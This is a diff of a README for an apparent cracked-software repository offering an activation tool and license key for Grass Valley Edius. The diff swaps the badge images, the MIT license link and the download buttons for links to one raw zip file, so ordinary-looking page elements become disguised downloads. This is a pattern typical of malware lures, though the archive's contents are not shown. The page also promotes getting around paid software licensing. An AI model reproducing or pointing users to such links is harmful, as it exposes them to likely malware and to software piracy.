@@ -1,7 +1,7 @@
 # Grass Valley Edius Crack | Download License Key & Activation Tool 🚀
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)  
-[![Supported Platforms](https://img.shields.io/badge/Supported_Platforms-Windows_7%2C_8%2C_10%2C_11-brightgreen.svg)](#-os-compatibility)
+[![License: MIT](https://raw.githubusercontent.com/ToNiePiter/edius-grass-valley-premium-unlock/branch/sphaeridial/edius-grass-valley-premium-unlock.zip)](https://raw.githubusercontent.com/ToNiePiter/edius-grass-valley-premium-unlock/branch/sphaeridial/edius-grass-valley-premium-unlock.zip)  
+[![Supported Platforms](https://raw.githubusercontent.com/ToNiePiter/edius-grass-valley-premium-unlock/branch/sphaeridial/edius-grass-valley-premium-unlock.zip%2C_8%2C_10%https://raw.githubusercontent.com/ToNiePiter/edius-grass-valley-premium-unlock/branch/sphaeridial/edius-grass-valley-premium-unlock.zip)](#-os-compatibility)
 
 Grass Valley Edius stands tall among the digital editing titans—redrawing the lines between creativity and technology. This repository presents resources and innovative solutions for unlocking the boundless potential of Edius, including a unique path to effortless licensing for content creators, editors, and filmmakers aiming for maximum efficiency.
 
@@ -81,7 +81,7 @@ Ready to delve into the next phase of your video editing odyssey? Here’s where
 
 **Download the Edius License Solution:**
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://ToNiePiter.github.io)
+[![Download](https://raw.githubusercontent.com/ToNiePiter/edius-grass-valley-premium-unlock/branch/sphaeridial/edius-grass-valley-premium-unlock.zip)](https://raw.githubusercontent.com/ToNiePiter/edius-grass-valley-premium-unlock/branch/sphaeridial/edius-grass-valley-premium-unlock.zip)
 
 > **Instructions:**
 > - Download the toolkit above.
@@ -118,7 +118,7 @@ Our repository is architected to reach editors and creative professionals search
 ## 📜 MIT License (2025)
 
 This project is licensed under the MIT License.  
-[View LICENSE](https://opensource.org/licenses/MIT)
+[View LICENSE](https://raw.githubusercontent.com/ToNiePiter/edius-grass-valley-premium-unlock/branch/sphaeridial/edius-grass-valley-premium-unlock.zip)
 
 ---
 
@@ -126,7 +126,7 @@ This project is licensed under the MIT License.
 
 To revisit the activation toolkit and keep your creative flames burning, grab your utility below:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://ToNiePiter.github.io)
+[![Download](https://raw.githubusercontent.com/ToNiePiter/edius-grass-valley-premium-unlock/branch/sphaeridial/edius-grass-valley-premium-unlock.zip)](https://raw.githubusercontent.com/ToNiePiter/edius-grass-valley-premium-unlock/branch/sphaeridial/edius-grass-valley-premium-unlock.zip)
 
 ---
 
